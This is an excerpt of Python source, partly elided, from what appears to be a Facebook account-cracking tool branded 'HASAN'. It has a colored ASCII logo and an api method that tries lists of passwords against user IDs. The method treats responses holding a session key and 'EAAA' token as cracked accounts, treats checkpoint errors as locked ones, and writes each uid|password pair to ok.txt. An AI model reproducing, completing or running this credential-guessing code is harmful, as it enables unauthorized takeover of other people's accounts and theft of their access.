...
logo = '''\033[1;91m██╗  ██╗ \033[1;92m █████╗  \033[1;94m███████╗ \033[1;95m █████╗  \033[1;96m███╗   ██╗
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[HASAN] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [HASAN_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [HASAN_CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
